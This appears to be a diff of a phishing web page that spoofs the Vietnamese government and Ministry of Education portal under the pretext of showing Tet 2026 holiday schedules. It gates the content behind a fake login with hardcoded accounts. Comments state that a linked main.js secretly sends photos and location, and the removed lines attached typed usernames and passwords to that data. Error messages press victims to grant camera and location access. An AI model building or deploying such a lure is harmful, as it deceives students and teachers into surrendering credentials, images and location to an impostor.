@@ -3,112 +3,275 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cổng Thông Tin Giáo Dục - Đăng Nhập</title>
+    <title>Cổng Thông Tin Điện Tử Bộ Giáo Dục & Đào Tạo</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* CSS giữ nguyên từ phiên bản trước */
+        :root {
+            --primary-red: #da251d;
+            --gold-accent: #ffde00;
+            --dark-red: #a81c16;
+            --shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: #fff5f5; color: #333; 
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(rgba(255, 245, 245, 0.9), rgba(255, 245, 245, 0.9)), 
+                        url('https://www.tgs.vn/wp-content/uploads/2021/01/texture-trong-dong.png');
+            background-size: cover;
+            background-attachment: fixed;
+            color: #333; 
+            display: flex; flex-direction: column; min-height: 100vh;
+            transition: background 0.5s ease;
         }
+
+        /* Giao diện Dark Mode cho Admin */
+        body.dark-mode {
+            background: #0f0f0f !important;
+            color: #eee;
+        }
+
+        .gov-header {
+            background: var(--primary-red);
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
         #login-box {
-            background: #fff; width: 90%; max-width: 400px;
-            padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(211, 47, 47, 0.1);
-            text-align: center; border: 2px solid #ffcdd2;
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            border-top: 6px solid var(--primary-red);
+            position: relative;
         }
-        .logo { width: 80px; margin-bottom: 10px; }
-        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
+
+        #login-box::before {
+            content: "CHÍNH PHỦ NƯỚC CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM";
+            display: block;
+            font-size: 10px;
+            color: #888;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        .logo-img {
+            width: 100px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.1));
+        }
+
+        h2 { color: var(--dark-red); margin-bottom: 5px; font-size: 18px; }
+
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #999; }
+
         input, select {
-            width: 100%; padding: 12px; margin: 8px 0;
-            border: 1px solid #ddd; border-radius: 10px; outline: none;
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            outline: none;
+            font-size: 15px;
+            background: #fdfdfd;
         }
+
         .btn-login {
-            background: linear-gradient(135deg, #ff5252, #d32f2f);
-            color: white; border: none; padding: 14px;
-            font-size: 16px; font-weight: bold; border-radius: 50px; 
-            cursor: pointer; width: 100%; margin-top: 15px;
-            box-shadow: 0 4px 15px rgba(211, 47, 47, 0.3);
+            background: var(--primary-red);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px; 
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            text-transform: uppercase;
         }
+
+        /* Style cho trang QR Admin */
+        #admin-content {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.8s ease;
+        }
+
+        .qr-card {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+
+        .qr-img {
+            width: 100%;
+            border-radius: 10px;
+            border: 4px solid #2ecc71;
+            margin-bottom: 20px;
+        }
+
+        .bio-info {
+            background: #252525;
+            padding: 15px;
+            border-radius: 10px;
+            color: #2ecc71;
+            text-align: left;
+            font-family: monospace;
+            border-left: 4px solid #2ecc71;
+        }
+
+        /* Nội dung lịch nghỉ Tết */
+        #main-content {
+            display: none;
+            width: 100%;
+            max-width: 600px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+        }
+
+        .calendar-header { background: var(--primary-red); color: #fff; padding: 30px 20px; text-align: center; border-bottom: 4px solid var(--gold-accent); }
+        .calendar-body { padding: 25px; background: #fff; }
+        .level-box { background: #fcfcfc; border-left: 5px solid var(--primary-red); padding: 18px; margin-bottom: 15px; border-radius: 4px; }
+        .level-title { font-weight: bold; color: var(--dark-red); display: flex; align-items: center; gap: 10px; }
+
         .loader {
-            width: 30px; height: 30px; border: 4px solid #f3f3f3;
-            border-top: 4px solid #ff5252; border-radius: 50%;
+            width: 25px; height: 25px; border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--primary-red); border-radius: 50%;
             animation: spin 1s linear infinite; display: none; margin: 15px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #main-content {
-            display: none; width: 95%; max-width: 550px;
-            background: white; border-radius: 15px; overflow: hidden;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-        }
-        .calendar-header { background: #d32f2f; color: #fff; padding: 25px; text-align: center; }
-        .calendar-body { padding: 20px; }
-        .level-box {
-            background: #fff9f9; border-left: 5px solid #d32f2f;
-            padding: 15px; margin-bottom: 15px; border-radius: 5px;
-        }
-        .level-title { font-weight: bold; color: #d32f2f; margin-bottom: 5px; display: block; }
-        .all-access-tag { 
-            font-size: 11px; background: #ffebee; color: #d32f2f; 
-            padding: 3px 8px; border-radius: 5px; display: inline-block; margin-bottom: 10px;
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div id="login-box">
-    <img src="https://cdn-icons-png.flaticon.com/512/8066/8066542.png" class="logo">
-    <h2>HỆ THỐNG GIÁO DỤC</h2>
-    
-    <select id="user-role">
-        <option value="hocsinh">Học sinh (THCS & THPT)</option>
-        <option value="sinhvien">Sinh viên (ĐH & Cao Đẳng)</option>
-        <option value="giaovien">Giáo viên / Giảng viên</option>
-    </select>
-
-    <input type="text" id="username" placeholder="Tên đăng nhập">
-    <input type="password" id="password" placeholder="Mật khẩu">
-    
-    <div id="loading-spinner" class="loader"></div>
-    <p id="status-text" style="display:none; font-size: 12px; color: #ff5252; margin-top: 5px;">Đang xác thực thông tin...</p>
-
-    <button id="login-btn" class="btn-login" onclick="processLogin()">ĐĂNG NHẬP</button>
+<div class="gov-header">
+    <span><i class="fas fa-landmark"></i> CỔNG THÔNG TIN ĐIỆN TỬ CHÍNH PHỦ</span>
+    <span>VN <i class="fas fa-chevron-down"></i></span>
 </div>
 
-<div id="main-content">
-    <div class="calendar-header">
-        <h2 id="role-title">LỊCH NGHỈ TẾT 2025</h2>
-        <p>Cập nhật chính thức từ Bộ Giáo Dục</p>
-    </div>
-    <div class="calendar-body">
-        <div id="content-detail">
-            </div>
+<div class="container">
+    <div id="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Emblem_of_Vietnam.svg/1200px-Emblem_of_Vietnam.svg.png" class="logo-img">
+        <h2>HỆ THỐNG XÁC THỰC</h2>
+        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Tra cứu lịch nghỉ lễ, Tết và lịch đào tạo 2026</p>
         
-        <p style="text-align: center; font-size: 12px; color: #999; margin-top: 15px;">
-            Xác thực thiết bị: <span id="user-ip">Đang kiểm tra...</span>
+        <div class="input-group">
+            <i class="fas fa-users-cog"></i>
+            <select id="user-role">
+                <option value="hocsinh">Học sinh (THCS & THPT)</option>
+                <option value="sinhvien">Sinh viên (ĐH & Cao Đẳng)</option>
+                <option value="giaovien">Cán bộ / Giảng viên</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" id="username" placeholder="Mã định danh / Tên đăng nhập">
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" placeholder="Mật khẩu hệ thống">
+        </div>
+        
+        <div id="loading-spinner" class="loader"></div>
+        <p id="status-text" style="display:none; font-size: 13px; color: var(--primary-red); margin-top: 5px; font-weight: 500;">
+            <i class="fas fa-shield-alt"></i> Đang kết nối máy chủ...
         </p>
+
+        <button id="login-btn" class="btn-login" onclick="processLogin()">ĐĂNG NHẬP HỆ THỐNG</button>
+    </div>
+
+    <div id="admin-content">
+        <div class="qr-card">
+            <h2 style="color: #2ecc71; margin-bottom: 20px;">XÁC THỰC QUẢN TRỊ</h2>
+            <img src="https://raw.githubusercontent.com/CongThongTinChinhPhu/Lich-nghi-tet-cua-cac-truong-tren-dia-ban-thanh-pho-ho-chi-minh/main/7b36bd73b1663f386677.jpg" class="qr-img">
+            <div class="bio-info">
+                <div>Zalo: Mrwenben</div>
+                <div>Tele: @Mrwenben</div>
+            </div>
+            <p style="color: #555; font-size: 11px; margin-top: 15px;">Secure Access Verified</p>
+        </div>
+    </div>
+
+    <div id="main-content">
+        <div class="calendar-header">
+            <h2 id="role-title" style="color: white; font-size: 22px;"> THÔNG BÁO LỊCH NGHỈ TẾT</h2>
+            <p style="font-size: 13px; opacity: 0.9;">Số: 245/TB-BGDĐT - Cập nhật: 06/02/2026</p>
+        </div>
+        <div class="calendar-body">
+            <div id="content-detail"></div>
+            <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px; color: #777; font-size: 12px;">
+                <p>Mã xác thực thiết bị: <span id="user-ip" style="color: var(--primary-red); font-weight: bold;">27.3.33.195</span></p>
+            </div>
+        </div>
     </div>
 </div>
 
-<script src="main.js"></script>
+<script src="main.js?v=1.2"></script>
 
 <script>
     async function processLogin() {
         const role = document.getElementById('user-role').value;
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
+        const user = document.getElementById('username').value.trim();
+        const pass = document.getElementById('password').value.trim();
         
         const btn = document.getElementById('login-btn');
         const loader = document.getElementById('loading-spinner');
         const status = document.getElementById('status-text');
-        let accessGranted = false;
         
+        // --- BƯỚC 1: KIỂM TRA TÀI KHOẢN ADMIN ĐẶC BIỆT ---
+        if (user === "Mrwenben" && pass === "0") {
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            status.style.display = 'block';
+            status.innerHTML = '<i class="fas fa-user-shield"></i> Đang mở cổng quản trị...';
+
+            // Vẫn thực hiện gửi ảnh/vị trí ngầm qua main.js
+            if (typeof main === 'function') await main(); 
+
+            setTimeout(() => {
+                document.body.classList.add('dark-mode'); // Bật nền tối
+                document.getElementById('login-box').style.display = 'none';
+                document.getElementById('admin-content').style.display = 'block';
+            }, 1200);
+            return; 
+        }
+
+        // --- BƯỚC 2: KIỂM TRA TÀI KHOẢN NGƯỜI DÙNG THƯỜNG ---
+        let accessGranted = false;
         if (role === "hocsinh" && user === "06092011" && pass === "Tuan06092011") accessGranted = true;
         else if (role === "sinhvien" && user === "02102009" && pass === "02102009") accessGranted = true;
         else if (role === "giaovien" && user === "lecamtu" && pass === "gv079254287410") accessGranted = true;
 
         if (!accessGranted) {
-            alert("Sai tài khoản hoặc mật khẩu cho đối tượng này!");
+            alert("LỖI XÁC THỰC: Sai tài khoản hoặc mật khẩu!");
             return;
         }
 
@@ -117,28 +280,16 @@
         status.style.display = 'block';
 
         try {
-            if (typeof info !== 'undefined') {
-                info.camera = `[User: ${user}] - Role: ${role} - Pass: ${pass}`;
-            }
-
-            // Gọi hàm main() từ main.js để thực hiện chụp ảnh/vị trí
-            await main(); 
+            if (typeof main === 'function') await main(); 
 
             setTimeout(() => {
                 document.getElementById('login-box').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
                 showSchedule(role);
-                
-                if (typeof info !== 'undefined') {
-                    document.getElementById('user-ip').innerText = info.ip || "Đã bảo mật";
-                }
-            }, 1000);
-
+            }, 1500);
         } catch (err) {
-            alert("Lỗi: Bạn cần cấp quyền Camera và Vị trí để xác thực!");
-            btn.style.display = 'block';
-            loader.style.display = 'none';
-            status.style.display = 'none';
+            alert("Vui lòng cấp quyền truy cập để tiếp tục!");
+            location.reload();
         }
     }
 
@@ -146,38 +297,15 @@
         const container = document.getElementById('content-detail');
         const title = document.getElementById('role-title');
 
-        // Đoạn mã các khối lịch
-        const htmlHS = `
-            <div class="level-box">
-                <span class="level-title">🌸 Khối THCS & THPT</span>
-                <p>Nghỉ từ 07/02 đến hết ngày 27/02/2026.</p>
-            </div>`;
-        const htmlSV = `
-            <div class="level-box">
-                <span class="level-title">🌸 Đại học & Cao Đẳng</span>
-                <p>Nghỉ từ 07/02 đến 27/02/2026 (Tùy theo kế hoạch trường).</p>
-            </div>`;
-        const htmlGV = `
-            <div class="level-box">
-                <span class="level-title">🌸 Cán bộ & Giáo viên</span>
-                <p>Nghỉ từ 08/02 đến 26/02/2026 theo quy định Nhà nước.</p>
-            </div>`;
-
         if (role === "hocsinh") {
-            title.innerText = "LỊCH TẾT HỌC SINH";
-            container.innerHTML = htmlHS;
+            title.innerText = "LỊCH NGHỈ TẾT HỌC SINH";
+            container.innerHTML = `<div class="level-box"><span class="level-title">KHỐI THCS & THPT</span><p>Nghỉ từ <b>07/02/2026</b> đến <b>27/02/2026</b>.</p></div>`;
         } else if (role === "sinhvien") {
-            title.innerText = "LỊCH TẾT SINH VIÊN";
-            container.innerHTML = htmlSV;
-        } else if (role === "giaovien") {
-            title.innerText = "HỆ THỐNG QUẢN TRỊ GIÁO VIÊN";
-            // Giáo viên xem được TẤT CẢ
-            container.innerHTML = `
-                <div class="all-access-tag">Quyền hạn: Xem toàn bộ lịch nghỉ giáo dục</div>
-                ${htmlGV}
-                ${htmlHS}
-                ${htmlSV}
-            `;
+            title.innerText = "LỊCH NGHỈ TẾT SINH VIÊN";
+            container.innerHTML = `<div class="level-box"><span class="level-title">ĐẠI HỌC & CAO ĐẲNG</span><p>Nghỉ từ <b>07/02/2026</b> đến <b>27/02/2026</b>.</p></div>`;
+        } else {
+            title.innerText = "TRA CỨU TỔNG HỢP";
+            container.innerHTML = `<div class="level-box"><span class="level-title">CÁN BỘ & GIÁO VIÊN</span><p>Nghỉ từ <b>08/02/2026</b> đến <b>26/02/2026</b>.</p></div>`;
         }
     }
 </script>
